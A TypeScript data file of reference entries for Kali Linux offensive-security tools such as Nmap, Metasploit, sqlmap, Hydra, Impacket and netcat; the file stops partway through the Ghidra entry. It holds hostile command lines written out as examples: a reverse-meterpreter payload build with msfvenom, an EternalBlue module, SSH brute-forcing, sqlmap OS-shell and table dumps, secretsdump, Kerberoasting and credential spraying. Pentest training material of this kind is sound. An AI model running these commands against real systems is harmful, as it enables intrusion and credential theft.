import type { KaliTool } from "./types";

// Deep entries: detailed commands, examples, best scenarios, common errors.
export const KALI_DEEP_TOOLS: KaliTool[] = [
  {
    slug: "nmap", name: "Nmap", category: "Information Gathering", package: "nmap",
    homepage: "https://nmap.org", depth: "deep", invocation: "nmap",
    summary: "Network exploration and security auditing scanner: host discovery, port scanning, service/version detection, OS fingerprinting, and scripting via NSE.",
    commands: [
      { name: "nmap basic scan", syntax: "nmap TARGET", description: "Default TCP SYN scan of the 1000 most common ports.", examples: [{ code: "nmap 10.0.0.5", note: "Quick sweep of a single host." }], bestScenario: "Initial reconnaissance of a single IP.", category: "Scan" },
      { name: "nmap -sV", syntax: "nmap -sV TARGET", description: "Probe open ports to determine service and version.", examples: [{ code: "nmap -sV 10.0.0.5", note: "Adds service fingerprints." }], bestScenario: "Identify vulnerable service versions.", category: "Scan" },
      { name: "nmap -sС full script scan", syntax: "nmap -sC -sV TARGET", description: "Run default NSE scripts alongside service detection.", examples: [{ code: "nmap -sC -sV -oA scan 10.0.0.5", note: "All formats saved." }], bestScenario: "Standard first-pass enumeration.", category: "Scan" },
      { name: "nmap -p-", syntax: "nmap -p- TARGET", description: "Scan all 65535 TCP ports.", examples: [{ code: "nmap -p- --min-rate 1000 10.0.0.5", note: "Full port sweep." }], bestScenario: "Never miss a service on a non-standard port.", category: "Scan" },
      { name: "nmap -sU", syntax: "sudo nmap -sU TARGET", description: "UDP scan.", examples: [{ code: "sudo nmap -sU --top-ports 100 10.0.0.5", note: "Top UDP ports." }], bestScenario: "Enumerate UDP services (DNS, SNMP, VPN).", category: "Scan" },
      { name: "nmap -O", syntax: "sudo nmap -O TARGET", description: "OS detection via TCP/IP fingerprinting.", examples: [{ code: "sudo nmap -O 10.0.0.5", note: "Requires raw sockets (root)." }], bestScenario: "Identify the target OS remotely.", category: "Scan" },
      { name: "nmap -A", syntax: "sudo nmap -A TARGET", description: "Aggressive: OS + version + scripts + traceroute.", examples: [{ code: "sudo nmap -A 10.0.0.5", note: "Very noisy." }], bestScenario: "One-shot deep look at a target when stealth is not required.", category: "Scan" },
      { name: "nmap --script", syntax: "nmap --script CATEGORY_OR_NAME TARGET", description: "Run specific NSE scripts.", examples: [{ code: "nmap --script vuln 10.0.0.5", note: "Known-CVE checks." }, { code: "nmap --script smb-enum-shares -p445 10.0.0.5", note: "Enumerate SMB shares." }], bestScenario: "Targeted vulnerability or protocol enumeration.", category: "NSE" },
      { name: "nmap -Pn", syntax: "nmap -Pn TARGET", description: "Skip host discovery, assume host is up.", examples: [{ code: "nmap -Pn 10.0.0.5", note: "Bypass ICMP filtering." }], bestScenario: "Targets that drop ICMP echo.", category: "Scan" },
      { name: "nmap -T0..-T5", syntax: "nmap -TN TARGET", description: "Timing template from paranoid (0) to insane (5).", examples: [{ code: "nmap -T4 -p- 10.0.0.5", note: "Faster on reliable networks." }], bestScenario: "Balance speed vs stealth and reliability.", category: "Scan" },
      { name: "nmap -oA", syntax: "nmap -oA BASENAME TARGET", description: "Output normal, XML, and grepable formats.", examples: [{ code: "nmap -sC -sV -oA initial 10.0.0.5", note: "3 files: initial.nmap/.xml/.gnmap." }], bestScenario: "Feed results into other tools (ffuf, msf, eyewitness).", category: "Output" },
    ],
    errors: [
      { message: "You requested a scan type which requires root privileges", cause: "SYN, UDP, OS detection and raw-socket scans need CAP_NET_RAW.", fix: "Prefix with sudo or grant capabilities with setcap." },
      { message: "Failed to resolve TARGET", cause: "DNS resolution failed.", fix: "Use the IP directly, or specify --dns-servers." },
    ],
  },
  {
    slug: "metasploit", name: "Metasploit Framework", category: "Exploitation Tools", package: "metasploit-framework",
    homepage: "https://www.metasploit.com", depth: "deep", invocation: "msfconsole",
    summary: "Modular exploitation framework with thousands of exploits, payloads, auxiliaries, encoders, and post modules.",
    commands: [
      { name: "msfconsole", syntax: "msfconsole [-q]", description: "Launch the interactive Metasploit console.", examples: [{ code: "msfconsole -q", note: "Skip banner." }], bestScenario: "Primary interface for using the framework.", category: "Console" },
      { name: "search", syntax: "search TERM", description: "Search modules by name, CVE, platform, type.", examples: [{ code: "search cve:2021 type:exploit platform:windows", note: "Filtered search." }], bestScenario: "Find the right module fast.", category: "Console" },
      { name: "use", syntax: "use MODULE_PATH", description: "Load a module.", examples: [{ code: "use exploit/windows/smb/ms17_010_eternalblue", note: "Load EternalBlue." }], bestScenario: "Prepare a specific exploit or auxiliary.", category: "Console" },
      { name: "show options", syntax: "show options", description: "Display required and optional parameters of the current module.", examples: [{ code: "show options", note: "Inspect settings." }], bestScenario: "Verify what needs to be set.", category: "Console" },
      { name: "set", syntax: "set OPT VALUE", description: "Set a module option.", examples: [{ code: "set RHOSTS 10.0.0.5", note: "Target." }], bestScenario: "Configure exploits before running.", category: "Console" },
      { name: "run / exploit", syntax: "run", description: "Execute the loaded module.", examples: [{ code: "run", note: "Fire." }], bestScenario: "Trigger the exploit or auxiliary.", category: "Console" },
      { name: "sessions", syntax: "sessions [-i ID]", description: "List or interact with active sessions.", examples: [{ code: "sessions -i 1", note: "Attach to session 1." }], bestScenario: "Return to a shell/meterpreter session.", category: "Sessions" },
      { name: "msfvenom", syntax: "msfvenom -p PAYLOAD LHOST=... LPORT=... -f FMT -o OUT", description: "Standalone payload generator (was msfpayload+msfencode).", examples: [{ code: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f exe -o shell.exe", note: "Windows reverse meterpreter." }], bestScenario: "Generate payloads to drop on a target.", category: "Payload" },
      { name: "handler", syntax: "use exploit/multi/handler", description: "Listener for reverse connections from payloads.", examples: [{ code: "use exploit/multi/handler; set PAYLOAD ...; set LHOST ...; set LPORT ...; run -j", note: "Background handler." }], bestScenario: "Catch callback from a delivered payload.", category: "Handler" },
    ],
    errors: [
      { message: "Database not connected", cause: "PostgreSQL is not initialized or not running.", fix: "Exit msfconsole and run sudo msfdb init; then start postgres: sudo systemctl start postgresql." },
      { message: "Exploit failed: Rex::ConnectionTimeout", cause: "Target port unreachable, filtered, or wrong RHOSTS/RPORT.", fix: "Verify with nmap and firewall rules; try different LHOST route." },
    ],
  },
  {
    slug: "burpsuite", name: "Burp Suite Community", category: "Web Application Analysis", package: "burpsuite",
    homepage: "https://portswigger.net/burp", depth: "deep", invocation: "burpsuite",
    summary: "Intercepting web proxy for auditing web applications: interception, repeater, intruder, decoder, and comparer.",
    commands: [
      { name: "burpsuite", syntax: "burpsuite", description: "Launch the Burp Suite GUI.", examples: [{ code: "burpsuite &", note: "Background it." }], bestScenario: "All web app testing.", category: "Launch" },
      { name: "Set browser proxy", syntax: "http://127.0.0.1:8080", description: "Configure your browser to proxy through Burp.", examples: [{ code: "Firefox → Settings → Network → Manual proxy → 127.0.0.1:8080", note: "" }], bestScenario: "Any interception.", category: "Setup" },
      { name: "Install CA", syntax: "http://burp/cert", description: "Install Burp's CA in your browser to intercept HTTPS.", examples: [{ code: "Visit http://burp while proxied, download CA, import as trusted authority.", note: "" }], bestScenario: "HTTPS interception without warnings.", category: "Setup" },
    ],
    errors: [
      { message: "Address already in use: 8080", cause: "Another process holds the port.", fix: "Change Proxy listener port in Burp, or free the port with ss -tulpn | grep 8080." },
    ],
  },
  {
    slug: "sqlmap", name: "sqlmap", category: "Database Assessment", package: "sqlmap",
    homepage: "https://sqlmap.org", depth: "deep", invocation: "sqlmap",
    summary: "Automatic SQL injection detection and exploitation with database takeover features.",
    commands: [
      { name: "sqlmap -u", syntax: "sqlmap -u URL", description: "Test a URL for SQL injection.", examples: [{ code: "sqlmap -u 'https://x/y?id=1' --batch", note: "Non-interactive." }], bestScenario: "Quick injection check on a suspected parameter.", category: "Scan" },
      { name: "sqlmap --dbs", syntax: "sqlmap -u URL --dbs", description: "Enumerate available databases.", examples: [{ code: "sqlmap -u '...' --dbs", note: "List DBs." }], bestScenario: "Post-detection enumeration.", category: "Enumerate" },
      { name: "sqlmap --tables", syntax: "sqlmap -u URL -D DB --tables", description: "List tables in a database.", examples: [{ code: "sqlmap -u '...' -D app --tables", note: "" }], bestScenario: "Map schema of a target DB.", category: "Enumerate" },
      { name: "sqlmap --dump", syntax: "sqlmap -u URL -D DB -T TABLE --dump", description: "Dump table contents.", examples: [{ code: "sqlmap -u '...' -D app -T users --dump", note: "" }], bestScenario: "Extract data from a confirmed table.", category: "Exploit" },
      { name: "sqlmap -r", syntax: "sqlmap -r req.txt", description: "Use a captured HTTP request file (from Burp).", examples: [{ code: "sqlmap -r req.txt --level 5 --risk 3 --batch", note: "Deep test." }], bestScenario: "Complex POST/JSON/auth flows.", category: "Scan" },
      { name: "sqlmap --os-shell", syntax: "sqlmap -u URL --os-shell", description: "Try to get an OS shell via SQLi.", examples: [{ code: "sqlmap -u '...' --os-shell", note: "Requires FS write privs on DB." }], bestScenario: "Post-exploitation upgrade from SQLi to RCE.", category: "Exploit" },
    ],
    errors: [
      { message: "no parameter(s) found for testing", cause: "URL has no GET params or -r file missing markers.", fix: "Provide --data for POST, or mark parameters with * in the request file." },
    ],
  },
  {
    slug: "hydra", name: "THC-Hydra", category: "Password Attacks", package: "hydra",
    homepage: "https://github.com/vanhauser-thc/thc-hydra", depth: "deep", invocation: "hydra",
    summary: "Fast parallel network login cracker supporting many protocols (SSH, FTP, HTTP, RDP, SMB, and more).",
    commands: [
      { name: "hydra ssh", syntax: "hydra -l USER -P WORDLIST ssh://HOST", description: "Brute-force SSH.", examples: [{ code: "hydra -l root -P rockyou.txt ssh://10.0.0.5 -t 4", note: "4 parallel tasks." }], bestScenario: "Authorized SSH brute-force with a small user set.", category: "Brute Force" },
      { name: "hydra HTTP form", syntax: "hydra -L users -P pass 10.0.0.5 http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'", description: "Brute-force HTTP POST login forms.", examples: [{ code: "hydra -l admin -P rockyou.txt 10.0.0.5 http-post-form '/login:user=^USER^&pass=^PASS^:F=Login failed'", note: "" }], bestScenario: "Web login form auditing.", category: "Brute Force" },
      { name: "hydra ftp", syntax: "hydra -L users -P pass ftp://HOST", description: "FTP brute-force.", examples: [{ code: "hydra -L users.txt -P rockyou.txt ftp://10.0.0.5", note: "" }], bestScenario: "Legacy FTP servers.", category: "Brute Force" },
    ],
    errors: [
      { message: "[ERROR] Compiled without LIBSSH v0.4.x+ support", cause: "SSH module missing on this build.", fix: "Rebuild hydra with --with-ssh or install a packaged version." },
    ],
  },
  {
    slug: "john", name: "John the Ripper", category: "Password Attacks", package: "john",
    homepage: "https://www.openwall.com/john/", depth: "deep", invocation: "john",
    summary: "Password hash cracker supporting hundreds of hash formats with wordlist, incremental, and mask modes.",
    commands: [
      { name: "john hashes", syntax: "john HASHFILE", description: "Auto-detect format and start cracking.", examples: [{ code: "john hashes.txt", note: "" }], bestScenario: "Kick off a session on mixed hashes.", category: "Crack" },
      { name: "john --wordlist", syntax: "john --wordlist=WORDS HASHFILE", description: "Use a wordlist.", examples: [{ code: "john --wordlist=rockyou.txt hashes.txt", note: "" }], bestScenario: "First-pass with common passwords.", category: "Crack" },
      { name: "john --format", syntax: "john --format=NAME HASHFILE", description: "Force a specific hash format.", examples: [{ code: "john --format=nt hashes.txt", note: "NTLM." }], bestScenario: "Disambiguate when auto-detect is wrong.", category: "Crack" },
      { name: "john --show", syntax: "john --show HASHFILE", description: "Display cracked passwords.", examples: [{ code: "john --show hashes.txt", note: "" }], bestScenario: "Retrieve results after cracking.", category: "Crack" },
      { name: "unshadow", syntax: "unshadow /etc/passwd /etc/shadow > out", description: "Combine passwd+shadow into a format john can crack.", examples: [{ code: "unshadow passwd shadow > combined", note: "" }], bestScenario: "Local Linux hash cracking.", category: "Prep" },
    ],
    errors: [
      { message: "No password hashes loaded", cause: "Wrong format, malformed file, or already-cracked hashes.", fix: "Try --format=... explicitly; validate one hash line per entry." },
    ],
  },
  {
    slug: "hashcat", name: "hashcat", category: "Password Attacks", package: "hashcat",
    homepage: "https://hashcat.net", depth: "deep", invocation: "hashcat",
    summary: "GPU-accelerated password recovery. Supports 300+ hash modes and multiple attack types.",
    commands: [
      { name: "hashcat wordlist", syntax: "hashcat -m MODE -a 0 HASH WORDLIST", description: "Straight (wordlist) attack.", examples: [{ code: "hashcat -m 1000 -a 0 hashes.txt rockyou.txt", note: "NTLM." }], bestScenario: "First-pass, fastest for common passwords.", category: "Attack" },
      { name: "hashcat mask", syntax: "hashcat -m MODE -a 3 HASH MASK", description: "Mask attack (bruteforce with structure).", examples: [{ code: "hashcat -m 0 -a 3 hashes.txt '?u?l?l?l?l?l?d?d'", note: "8 chars with pattern." }], bestScenario: "Known-format passwords (e.g. corporate policy).", category: "Attack" },
      { name: "hashcat rules", syntax: "hashcat -m MODE -a 0 HASH WORDLIST -r RULES", description: "Wordlist + rules for mutations.", examples: [{ code: "hashcat -m 1000 hashes.txt rockyou.txt -r rules/best64.rule", note: "" }], bestScenario: "Boost success on real-world password variants.", category: "Attack" },
      { name: "hashcat --show", syntax: "hashcat -m MODE HASH --show", description: "Show cracked passwords from the potfile.", examples: [{ code: "hashcat -m 1000 hashes.txt --show", note: "" }], bestScenario: "Retrieve results.", category: "Output" },
    ],
    errors: [
      { message: "Not enough allocatable device memory", cause: "GPU too small for chosen workload profile.", fix: "Lower -w (workload) or use -O (optimized kernel), or crack on CPU with --force." },
      { message: "No devices found/left", cause: "Drivers missing or running in VM without GPU passthrough.", fix: "Install proper GPU drivers or add --force to run on CPU." },
    ],
  },
  {
    slug: "aircrack-ng", name: "Aircrack-ng suite", category: "Wireless Attacks", package: "aircrack-ng",
    homepage: "https://www.aircrack-ng.org", depth: "deep", invocation: "aircrack-ng",
    summary: "Suite for auditing wireless networks: capture, injection, WEP/WPA cracking.",
    commands: [
      { name: "airmon-ng", syntax: "sudo airmon-ng start IFACE", description: "Enable monitor mode on a wireless adapter.", examples: [{ code: "sudo airmon-ng check kill && sudo airmon-ng start wlan0", note: "" }], bestScenario: "Prep before capture.", category: "Prep" },
      { name: "airodump-ng", syntax: "sudo airodump-ng MON_IFACE", description: "Capture 802.11 frames and enumerate APs/clients.", examples: [{ code: "sudo airodump-ng -c 6 --bssid AA:BB:.. -w cap wlan0mon", note: "Capture handshake." }], bestScenario: "Recon and handshake capture.", category: "Capture" },
      { name: "aireplay-ng deauth", syntax: "sudo aireplay-ng -0 N -a BSSID MON", description: "Send deauth frames to force reauthentication (handshake).", examples: [{ code: "sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon", note: "" }], bestScenario: "Force handshake for capture.", category: "Attack" },
      { name: "aircrack-ng", syntax: "aircrack-ng -w WORDLIST CAPTURE.cap", description: "Crack WEP/WPA(2) from captures.", examples: [{ code: "aircrack-ng -w rockyou.txt cap-01.cap", note: "" }], bestScenario: "Offline WPA2 dictionary attack.", category: "Crack" },
    ],
    errors: [
      { message: "Interface wlan0mon does not exist", cause: "Monitor mode didn't start.", fix: "Kill NetworkManager, run airmon-ng check kill, verify chipset supports monitor mode." },
    ],
  },
  {
    slug: "wireshark", name: "Wireshark", category: "Sniffing & Spoofing", package: "wireshark",
    homepage: "https://www.wireshark.org", depth: "deep", invocation: "wireshark",
    summary: "GUI network protocol analyzer supporting hundreds of protocols and deep inspection.",
    commands: [
      { name: "wireshark", syntax: "wireshark", description: "Launch the GUI.", examples: [{ code: "wireshark -k -i eth0", note: "Start capturing immediately." }], bestScenario: "Interactive packet analysis.", category: "Launch" },
      { name: "capture filter", syntax: "BPF expression in capture options", description: "Limit what gets captured (BPF syntax).", examples: [{ code: "host 10.0.0.5 and port 443", note: "" }], bestScenario: "Reduce capture size in noisy environments.", category: "Filter" },
      { name: "display filter", syntax: "Wireshark display syntax", description: "Filter already-captured packets.", examples: [{ code: "http.request.method == 'POST' and tcp.port == 443", note: "" }], bestScenario: "Zoom in on interesting traffic.", category: "Filter" },
      { name: "tshark", syntax: "tshark -i IFACE [-f FILTER] [-w OUT]", description: "Command-line Wireshark for scripts and headless captures.", examples: [{ code: "tshark -i eth0 -f 'port 53' -w dns.pcap", note: "" }], bestScenario: "Automated captures on servers.", category: "CLI" },
    ],
    errors: [
      { message: "You don't have permission to capture on that device", cause: "User is not in the wireshark group / dumpcap lacks capabilities.", fix: "sudo dpkg-reconfigure wireshark-common, add your user to the wireshark group, log out/in." },
    ],
  },
  {
    slug: "tcpdump", name: "tcpdump", category: "Sniffing & Spoofing", package: "tcpdump",
    homepage: "https://www.tcpdump.org", depth: "deep", invocation: "tcpdump",
    summary: "Classic CLI packet capture tool using BPF filters.",
    commands: [
      { name: "tcpdump basic", syntax: "sudo tcpdump -i IFACE", description: "Capture packets on an interface.", examples: [{ code: "sudo tcpdump -i eth0", note: "" }], bestScenario: "Ad-hoc packet inspection on servers.", category: "Capture" },
      { name: "tcpdump -w", syntax: "sudo tcpdump -i IFACE -w FILE.pcap", description: "Write to pcap for later analysis.", examples: [{ code: "sudo tcpdump -i eth0 -w cap.pcap port 80", note: "" }], bestScenario: "Save captures for Wireshark.", category: "Capture" },
      { name: "tcpdump filters", syntax: "sudo tcpdump -i IFACE 'FILTER'", description: "BPF filter expression.", examples: [{ code: "sudo tcpdump -i eth0 'host 1.1.1.1 and (tcp port 80 or 443)'", note: "" }], bestScenario: "Focus on relevant traffic.", category: "Filter" },
      { name: "tcpdump -A / -X", syntax: "sudo tcpdump -A -i IFACE", description: "ASCII / hex payload output.", examples: [{ code: "sudo tcpdump -A -i eth0 port 80", note: "" }], bestScenario: "Quick payload peek for cleartext protocols.", category: "Output" },
    ],
    errors: [
      { message: "no suitable device found", cause: "Insufficient permissions or no interfaces up.", fix: "Run with sudo or grant CAP_NET_RAW; check ip link." },
    ],
  },
  {
    slug: "gobuster", name: "Gobuster", category: "Web Application Analysis", package: "gobuster",
    homepage: "https://github.com/OJ/gobuster", depth: "deep", invocation: "gobuster",
    summary: "Fast directory, DNS subdomain, vhost, and S3 bucket brute-forcer written in Go.",
    commands: [
      { name: "gobuster dir", syntax: "gobuster dir -u URL -w WORDLIST", description: "Directory/file brute-force.", examples: [{ code: "gobuster dir -u https://x -w /usr/share/wordlists/dirb/common.txt -t 50", note: "" }], bestScenario: "Discover hidden endpoints on web apps.", category: "Mode" },
      { name: "gobuster dns", syntax: "gobuster dns -d DOMAIN -w WORDLIST", description: "Subdomain enumeration.", examples: [{ code: "gobuster dns -d example.com -w subdomains.txt", note: "" }], bestScenario: "Recon subdomains for a scope.", category: "Mode" },
      { name: "gobuster vhost", syntax: "gobuster vhost -u URL -w WORDLIST", description: "Virtual host brute-force via Host header.", examples: [{ code: "gobuster vhost -u https://ip -w vhosts.txt", note: "" }], bestScenario: "Find apps served by Host header on shared IPs.", category: "Mode" },
    ],
    errors: [
      { message: "Error: the server returns a status code that matches the provided options for non-existing urls", cause: "The server always answers 200 for missing pages.", fix: "Use --exclude-length or -b to blacklist that status/length." },
    ],
  },
  {
    slug: "ffuf", name: "ffuf", category: "Web Application Analysis", package: "ffuf",
    homepage: "https://github.com/ffuf/ffuf", depth: "deep", invocation: "ffuf",
    summary: "Fast web fuzzer for directories, parameters, subdomains, headers, and JSON payloads.",
    commands: [
      { name: "ffuf directory", syntax: "ffuf -u URL/FUZZ -w WORDLIST", description: "Fuzz a URL path.", examples: [{ code: "ffuf -u https://x/FUZZ -w common.txt -mc 200,301", note: "" }], bestScenario: "Directory discovery with filtering.", category: "Fuzz" },
      { name: "ffuf parameters", syntax: "ffuf -u 'URL?FUZZ=x' -w PARAMS", description: "Discover valid GET parameters.", examples: [{ code: "ffuf -u 'https://x/api?FUZZ=1' -w burp-params.txt -fs 0", note: "" }], bestScenario: "Find hidden query params.", category: "Fuzz" },
      { name: "ffuf vhost", syntax: "ffuf -u URL -H 'Host: FUZZ.example.com' -w subs", description: "Vhost enumeration.", examples: [{ code: "ffuf -u https://ip -H 'Host: FUZZ.example.com' -w subs.txt -fs 0", note: "" }], bestScenario: "Find hidden virtual hosts.", category: "Fuzz" },
    ],
    errors: [
      { message: "no matches were found", cause: "Wrong matcher/filter or auto-calibration filtered legit hits.", fix: "Adjust -mc / -fc / -fs, or use -ac for auto-calibration." },
    ],
  },
  {
    slug: "wpscan", name: "WPScan", category: "Web Application Analysis", package: "wpscan",
    homepage: "https://wpscan.com", depth: "deep", invocation: "wpscan",
    summary: "WordPress vulnerability scanner: users, plugins, themes, known CVEs.",
    commands: [
      { name: "wpscan enumerate", syntax: "wpscan --url URL --enumerate u,p,t", description: "Enumerate users, plugins, themes.", examples: [{ code: "wpscan --url https://x --enumerate u,ap,at --api-token TOKEN", note: "" }], bestScenario: "Baseline WordPress recon.", category: "Enumerate" },
      { name: "wpscan password", syntax: "wpscan --url URL --usernames USER --passwords LIST", description: "Password brute-force via xmlrpc/wp-login.", examples: [{ code: "wpscan --url https://x -U admin -P rockyou.txt", note: "" }], bestScenario: "Authorized WP account brute-force.", category: "Attack" },
    ],
    errors: [
      { message: "Scan Aborted: The URL supplied redirects to ...", cause: "Site forces HTTPS or a different host.", fix: "Use the final URL, or add --ignore-main-redirect." },
    ],
  },
  {
    slug: "nikto", name: "Nikto", category: "Vulnerability Analysis", package: "nikto",
    homepage: "https://cirt.net/nikto2", depth: "deep", invocation: "nikto",
    summary: "Web server scanner: dangerous files, outdated software, misconfigurations.",
    commands: [
      { name: "nikto -h", syntax: "nikto -h URL", description: "Scan a web server.", examples: [{ code: "nikto -h https://x -o out.txt", note: "" }], bestScenario: "Fast baseline web server audit.", category: "Scan" },
      { name: "nikto tuning", syntax: "nikto -h URL -T TUNING", description: "Restrict tests via tuning categories.", examples: [{ code: "nikto -h https://x -T 3", note: "Info disclosure only." }], bestScenario: "Focus scan and reduce noise.", category: "Scan" },
    ],
    errors: [
      { message: "No web server found", cause: "TLS/SNI mismatch or wrong port.", fix: "Add -ssl, specify -port, or provide the correct virtual host with -vhost." },
    ],
  },
  {
    slug: "responder", name: "Responder", category: "Sniffing & Spoofing", package: "responder",
    homepage: "https://github.com/lgandx/Responder", depth: "deep", invocation: "responder",
    summary: "LLMNR/NBT-NS/mDNS poisoner with rogue authentication servers (HTTP, SMB, MSSQL, FTP, LDAP).",
    commands: [
      { name: "responder default", syntax: "sudo responder -I IFACE", description: "Listen and poison broadcast name resolution.", examples: [{ code: "sudo responder -I eth0", note: "" }], bestScenario: "Grab NetNTLMv2 hashes on internal engagements.", category: "Listen" },
      { name: "responder -A", syntax: "sudo responder -I IFACE -A", description: "Analyze mode: log requests but do not poison.", examples: [{ code: "sudo responder -I eth0 -A", note: "" }], bestScenario: "Recon before active poisoning.", category: "Listen" },
    ],
    errors: [
      { message: "Error starting TCP server on port 445: [Errno 98] Address already in use", cause: "Samba is running.", fix: "sudo systemctl stop smbd nmbd; or disable SMB/HTTP listeners in Responder.conf." },
    ],
  },
  {
    slug: "impacket", name: "Impacket suite", category: "Exploitation Tools", package: "impacket-scripts",
    homepage: "https://github.com/fortra/impacket", depth: "deep", invocation: "impacket-*",
    summary: "Python classes and scripts for network protocols (SMB, MSRPC, Kerberos, LDAP), widely used for AD attacks.",
    commands: [
      { name: "impacket-secretsdump", syntax: "impacket-secretsdump DOMAIN/USER:PASS@TARGET", description: "Dump SAM, LSA, NTDS.dit secrets.", examples: [{ code: "impacket-secretsdump acme.local/admin:'P@ss'@dc01", note: "" }], bestScenario: "Post-DA credential extraction.", category: "AD" },
      { name: "impacket-psexec", syntax: "impacket-psexec DOMAIN/USER:PASS@TARGET", description: "Get a semi-interactive shell via SMB (like PsExec).", examples: [{ code: "impacket-psexec acme.local/admin@target", note: "" }], bestScenario: "Command execution on Windows via valid creds.", category: "AD" },
      { name: "impacket-smbexec", syntax: "impacket-smbexec DOMAIN/USER:PASS@TARGET", description: "Semi-interactive shell without touching PsExec-like service names.", examples: [{ code: "impacket-smbexec acme.local/svc@target", note: "" }], bestScenario: "Alternative to psexec, quieter.", category: "AD" },
      { name: "impacket-GetUserSPNs", syntax: "impacket-GetUserSPNs -request DOMAIN/USER:PASS", description: "Kerberoast — request TGS tickets for SPN accounts.", examples: [{ code: "impacket-GetUserSPNs -request acme.local/user:'pw' -dc-ip 10.0.0.1", note: "" }], bestScenario: "Offline crack of service account passwords.", category: "AD" },
      { name: "impacket-GetNPUsers", syntax: "impacket-GetNPUsers DOMAIN/ -usersfile users -no-pass", description: "AS-REP roasting on users with DONT_REQ_PREAUTH.", examples: [{ code: "impacket-GetNPUsers acme.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1", note: "" }], bestScenario: "Extract crackable hashes without creds.", category: "AD" },
    ],
    errors: [
      { message: "SMB SessionError: STATUS_LOGON_FAILURE", cause: "Wrong credentials or account locked.", fix: "Verify creds against a working service (crackmapexec) and check lockout policy." },
    ],
  },
  {
    slug: "crackmapexec", name: "CrackMapExec / NetExec", category: "Post Exploitation", package: "crackmapexec",
    homepage: "https://github.com/Pennyw0rth/NetExec", depth: "deep", invocation: "crackmapexec (or nxc)",
    summary: "Swiss army knife for Active Directory enumeration and lateral movement over SMB, WinRM, LDAP, MSSQL, SSH.",
    commands: [
      { name: "cme smb", syntax: "crackmapexec smb TARGETS -u USER -p PASS", description: "Authenticate over SMB and enumerate.", examples: [{ code: "crackmapexec smb 10.0.0.0/24 -u admin -p 'P@ss'", note: "Spray creds." }], bestScenario: "Validate creds across a subnet.", category: "SMB" },
      { name: "cme smb --shares", syntax: "crackmapexec smb TARGETS -u USER -p PASS --shares", description: "List accessible shares.", examples: [{ code: "crackmapexec smb 10.0.0.5 -u u -p p --shares", note: "" }], bestScenario: "Find file shares to explore.", category: "SMB" },
      { name: "cme winrm", syntax: "crackmapexec winrm TARGETS -u USER -p PASS", description: "Test WinRM auth.", examples: [{ code: "crackmapexec winrm 10.0.0.5 -u u -p p", note: "" }], bestScenario: "Identify hosts allowing WinRM.", category: "WinRM" },
    ],
    errors: [
      { message: "STATUS_ACCESS_DENIED", cause: "Non-admin user or SMB signing / UAC remote token filtering.", fix: "Try local admin, --local-auth, or use --exec-method smbexec." },
    ],
  },
  {
    slug: "bloodhound", name: "BloodHound", category: "Post Exploitation", package: "bloodhound",
    homepage: "https://bloodhound.readthedocs.io", depth: "deep", invocation: "bloodhound",
    summary: "Graph-based Active Directory attack path visualizer. Uses Neo4j and data collected by SharpHound/bloodhound.py.",
    commands: [
      { name: "bloodhound-python", syntax: "bloodhound-python -u USER -p PASS -d DOMAIN -c All -ns DC_IP", description: "Collect AD data via LDAP without SharpHound.", examples: [{ code: "bloodhound-python -u u -p p -d acme.local -c All -ns 10.0.0.1", note: "" }], bestScenario: "Linux-based data collection.", category: "Collect" },
      { name: "bloodhound GUI", syntax: "bloodhound", description: "Launch UI and import ZIPs.", examples: [{ code: "bloodhound", note: "Then drag/drop collected ZIP." }], bestScenario: "Visualize attack paths to Domain Admin.", category: "Analyze" },
    ],
    errors: [
      { message: "Failed to connect to Neo4j", cause: "Neo4j not running or wrong credentials.", fix: "sudo neo4j start; browse http://localhost:7474 to set the password." },
    ],
  },
  {
    slug: "enum4linux-ng", name: "enum4linux-ng", category: "Information Gathering", package: "enum4linux-ng",
    homepage: "https://github.com/cddmp/enum4linux-ng", depth: "deep", invocation: "enum4linux-ng",
    summary: "Modern Python rewrite of enum4linux for enumerating Windows/Samba systems (users, groups, shares, policies).",
    commands: [
      { name: "enum4linux-ng -A", syntax: "enum4linux-ng -A TARGET", description: "Run all enumeration checks.", examples: [{ code: "enum4linux-ng -A 10.0.0.5", note: "" }], bestScenario: "First-pass SMB/Windows enumeration.", category: "Enum" },
    ],
    errors: [],
  },
  {
    slug: "smbclient", name: "smbclient", category: "Information Gathering", package: "smbclient",
    homepage: "https://www.samba.org", depth: "deep", invocation: "smbclient",
    summary: "FTP-like client for SMB/CIFS shares.",
    commands: [
      { name: "smbclient list", syntax: "smbclient -L //HOST -N", description: "List shares (null session).", examples: [{ code: "smbclient -L //10.0.0.5 -N", note: "" }], bestScenario: "Anonymous share enumeration.", category: "SMB" },
      { name: "smbclient connect", syntax: "smbclient //HOST/SHARE -U USER", description: "Interactive access to a share.", examples: [{ code: "smbclient //10.0.0.5/public -U guest%''", note: "" }], bestScenario: "Browse/download from a share.", category: "SMB" },
    ],
    errors: [
      { message: "NT_STATUS_ACCESS_DENIED", cause: "No permission or wrong creds.", fix: "Try guest, add -N for null session, or supply valid credentials." },
    ],
  },
  {
    slug: "netcat", name: "Netcat (nc)", category: "Sniffing & Spoofing", package: "netcat-traditional",
    homepage: "https://nc110.sourceforge.io", depth: "deep", invocation: "nc",
    summary: "TCP/UDP swiss army knife for banner grabbing, port checks, reverse shells, and ad-hoc data transfer.",
    commands: [
      { name: "nc listen", syntax: "nc -lvnp PORT", description: "Listen on a port.", examples: [{ code: "nc -lvnp 4444", note: "Catch reverse shell." }], bestScenario: "Reverse shell handler.", category: "Listen" },
      { name: "nc connect", syntax: "nc HOST PORT", description: "Connect to host:port.", examples: [{ code: "echo HEAD / | nc example.com 80", note: "Banner." }], bestScenario: "Manual protocol testing.", category: "Client" },
      { name: "nc file transfer", syntax: "nc -lvnp PORT > out; nc HOST PORT < in", description: "Transfer files without SSH.", examples: [{ code: "receiver: nc -lvnp 9000 > f.bin ; sender: nc RECV 9000 < f.bin", note: "" }], bestScenario: "Constrained environments without scp.", category: "Transfer" },
    ],
    errors: [],
  },
  {
    slug: "ghidra", name: "Ghidra", category: "Reverse Engineering", package: "ghidra",
    homepage: "https://ghidra-sre.org", depth: "deep", invocation: "ghidra",
    summary: "NSA-developed open-source software reverse engineering (SRE) framework with decompiler.",
    commands: [
      { name: "ghidra", syntax: "ghidra", description: "Launch Ghidra project manager.", examples: [{ code: "ghidra &", note: "" }], bestScenario: "Reverse engineering binaries with decompilation.", category: "Launch" },
